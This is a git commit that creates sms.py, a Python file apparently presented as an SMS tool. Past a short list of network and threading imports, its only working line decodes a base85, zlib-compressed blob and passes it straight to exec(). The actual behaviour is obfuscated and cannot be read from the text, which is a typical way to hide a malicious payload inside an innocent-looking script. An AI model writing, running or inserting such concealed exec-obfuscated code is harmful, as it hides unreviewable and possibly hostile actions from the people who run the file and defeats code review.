4106562aada6a0c264456276b9f9ddb84d3c9606
JJTChannel <95204359+JJTChannel@users.noreply.github.com>
2023-01-24 16:42:07 +0700

    Create sms.py

---
+++ sms.py
@@ -0,0 +1,10 @@
+import requests,json
+import random
+import os
+import time
+import threading
+from requests import get
+from re import search
+from requests import Session
+from threading import Thread
+import zlib,base64;exec(zlib.decompress(base64.b85decode('c%0=|PjA~c6hB9wf)J2I9&EXe8>dO84Q{$-ZQ`~`oEAej42(ouY-Ca;sr*F%9}3Ke9abReumZVkhn;rX4(_)x@=5k&Te4+aj?>eC0fh1Rd++@o-y<JQ(T2~3LV~;vh*UEBMslXnK8Tsa8_|r*NK&*xV%Zf0JCxP6n&6F?2ldr;q9R2ENrHv#PBz~oQc_qzR~b`B+G-cjxHRRdRHR|(wg+T-25FivC{u>6>)+oi7GD?ES4#~|yZP`wIa=Yk`ZXPIO&+mo;5$4`x1X#UbD7373Gb@X(tDqZUwyo}`XwBF<g!1#x(-#Nsa}TosO6A-8r29gfp#h$@!UPV>6USZgWQtf<kN90c|0B8qM-_o@oOn3YW$SWmR=lk#68}qM9Dulz1w&1I!bRsX)hBeZG1OwS<~g@gL)^b)aWzs>Y(?AOFNW$DxT0@ry}umlxGI2wCHyT5#n%<W=5{m)k60|O}W+nf1_86cQ=>K@V74{kq=|YxJ@7Fj)7xu#FjmqW@IqYayr8-D{Kw;2R2F0l=W-L@U77W4dVm3nTqscj7Dt@!VlyW%V`Xgq9<0~tIJ4PlS2CXwa7UxaB~P57v4=pnzvb|$+I)0Eo|6#oM$G^#5EF28-h3#-h6B5>C@`Tp5lTe&0Nk1vJho{07&Okv(x_AY5&z}|IzvMGq{BhzJd80+~^uBBXVfBI_<wZ?cX}>KjF9Q03PA1)s!9~zEKEYj1H+G>{BDNrp?LTyAyc&FHj?+&Fzx6)#qE^JOi|^H{m&J=&n+}T+8RBsIj_<sWfeFDmTBaO5dIC?k>GNI-6g5IKT9`RC%_!da`r$vbujyG%7pGl5HGs?c%MH@T($lD`57hd=|L7JM+ayFuo2eBZ#ej3<R~hapsF<V1fa0d=H-v;sF-Eim?ZRjXm!G+lL_50#*-X=)g`FLW)hoh`@?i^}gWfS>(b)nh0r~>-&<3Tp4sqheB2O8TCAzUpDU{W1F(zWF3{6BRF-?vRN<-FfFdsGN|nP9(hF$wy4T47gx+;2^m}8Rx8_C<k3TdHi>=6GibwwmpsX@0-t%mRD58r+(#9DKs|!?a19IEch)a5rXnXQ-U`#_a!Rc|UZ*TC33Hw^QiYv;@d~nXu)<bNZ%8T~W|d0k-J|rnu=c~n0;G9FZSusi%1`!QKqVKjZS#Ps>ZwmGsNVut{)USgBc3H2QqTV9YLwMCI8(5ST)5_NDHtM98!ISS{v>yNe4MLs(Z~hDBh2Owan_OTVj+pL_N$L`51>Xm4wTCUJ?nY_No{d)@gaOh5rNKo-)7-|{+HcmLMkkd?o!7gOh?qQ78O4vY!Mw{F93~Uev#3?0{bkA+9hMw1rNd|y8z}3Xrx}R)}S$e@3jBvw0|0H>E1qFKr_#2kN~34&f(W*ofy#FVS^@`7pBptq1pQ;G!z!ln-=tQ#*{EoM&@6m(jiL')).decode())
